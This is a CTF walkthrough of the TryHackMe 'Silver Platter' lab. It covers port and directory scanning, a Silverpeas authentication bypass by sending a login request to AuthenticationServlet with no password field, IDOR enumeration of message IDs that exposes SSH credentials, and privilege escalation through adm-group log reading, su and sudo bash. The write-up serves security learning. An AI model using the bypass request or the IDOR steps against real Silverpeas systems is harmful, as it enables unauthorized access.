# Try Hack Me - Silver Platter
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: Authentication Bypass, IDOR, group privileges

# Reconnaissance:

nmap scan:
```bash
nmap -sV -sC <target_ip>
```
the services running are:

PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

8080/tcp open  http-proxy

now we enumerate the webpage at the port 80. after visiting the contact page, we get a message which says that

Contact

If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
now we note this down. the project silverpeas could be the name of a secret service or some directory. scr1ptkiddy could be the name of one of the users on the ssh server. lets run a thorough gobuster scan on this webpage

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt 
```
/assets               (Status: 301) [Size: 178] [--> http://silverplatter.thm/assets/]

/images               (Status: 301) [Size: 178] [--> http://silverplatter.thm/images/]                                                            

/index.html           (Status: 200) [Size: 14124]

lets enumerate each directory one by  one. turns out both /assets and /images are forbidden. so we are left with the hint given to use which talks about silverpeas. maybe it is an directory. on searching for silver peas with all the variations of the word silverpeas, we found negative results. maybe silverpeas could be a hostname? lets add silverpeas.thm as the hostname of the system.

```bash
echo "<target_ip> silverpeas.thm" | sudo tee -a /etc/hosts
```
tried this but still we couldn't get a hit. but wait there is another port which is hosting http webpages. lets try to search for a silverpeas directory on the port 8080. and boom we finally get a hit! on doing some research using deepseek i found out more about silverpeas. lets use whatweb to confirm the version of the silverpeas running on the port 8080

```bash
whatweb http://10.80.162.213:8080/silverpeas
```
we do not find any information on the versioon of silver peas so we jsut assume that it has the vulnerability to whichever search reuslt comes after googling for silverpeas exploit.
i found a promising report on github. you can read this if you want to: https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

now i will generate a php session cookie using curl and paste it in the cookies section by going to the developer tools of the login page.

```bash
curl -X POST http://10.80.162.213:8080/silverpeas/AuthenticationServlet \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "Login=scr1ptkiddy&DomainId=0" \
  -v
```

let me breakdown the attack vector for you. the thing is that this version of silverpeas is vulnerable to authentication bypass. the exploitation works in this flow:

using burp of curl you pass a request to the login page but omit the password field.

eg: POST /silverpeas/AuthenticationServlet HTTP/2

Host: 212.129.58.88

Content-Length: 28

Origin: https://212.129.58.88

Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&Password=SilverAdmin&DomainId=0

inorder to exploit this we will have to omit the password parameter entirely and the last line of the response header would look like:

Login=SilverAdmin&DomainId=0

->2 

now we copy the session cookie generated and paste it in the storage section which contains the session cookie named as JSESSIONID. after editing this we will visit the dashboard at the url

http://10.80.162.213:8080/silverpeas/look/jsp/MainFrame.jsp

now we have a dash board as scr1ptkiddy 

#NOTE: this was just an explanation and the examples used had no relevance to the actual ctf

now we access the page at the dashboard and then we find a message in the notification. it includes a username Tyler. now i didnt pay much attention to this message before but then after enumerating through the entire page including the admin's page (SilverAdmin is the username for the admin) i found nothing but dead ends. after almost spending 2 hours finding a lead i stumbled upon the personal workspace of sr1ptkiddy. now what i didn't expect was after i clicked on Game Night, i was directed to a webpage in another tab in my firefox browser which has a suspicious url. 

http://10.80.162.213:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5

now the parameter at the END is a big IDOR vulnerability. we can check previous messages using curl and access some more information. using curl we get a hit at ID=6

```bash
curl -H "Cookie: JSESSIONID=wctYoa2viOx9taGtAUJ2nhGgswtEQ8S5GYunP5XU.ebabc79c6d2a" \
  "http://10.80.162.213:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6" -v
```
note: substitute your own php session cookie which you previously generated using curl.

now we have something spicy! <div class="content-notification rich-content">
        Message:<div style="padding=10px 0 10px 0;"><br/>  <div style="background-color:#FFF9D7; border:1px solid #E2C822; padding:5px; width:600px;"><p>Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.&nbsp;</p><p>Username: tim</p><p>Password:REDACTED</p></div><br/></div><!--BEFORE_MESSAGE_FOOTER--><!--AFTER_MESSAGE_FOOTER-->
    </div>

we get the ssh credentials for the user tim. we now access the ssh shell

```bash
ssh tim@<target_ip>
```
we submit the user.txt flag. finding out that user tim cannot run sudo and there were no interesting suids and no cronjobs running, we move straight away to linpeas. in the /tmp directory, we ran the linpeas.sh and then found out that the user tim is in the (adm) groups. the adm group give you access to read system logs. we will search for the logs in the /var directory

```bash
cd /var/log
```
now after manually enumerating all the logs i found out that in the auth.log.2 the user tyler was mentioned. as the contents of this log was too large, we copy paste the contents to DeepSeek and prompt it to find any interesting credentials. and we get a hit!

```bash
cat auth.log.2
```
we find a database password in it. now i have learnt that in most of the ctfs the db password is not meant to actually access the database but instead it is just the password of the other higher privlieged user on the system. so we enter the password for the user tyler

```bash
su tyler
```
and boom! we get shell as tyler! lets see what commands tyler can run on the system. 
```bash
sudo -l
```
User tyler may run the following commands on ip-10-80-162-213:
   
 (ALL : ALL) ALL

well that was it for the ctf, tyler is basically at par with root in terms of privileges

```bash
sudo bash
```
we get a root shell and we submit the root.txt flag!





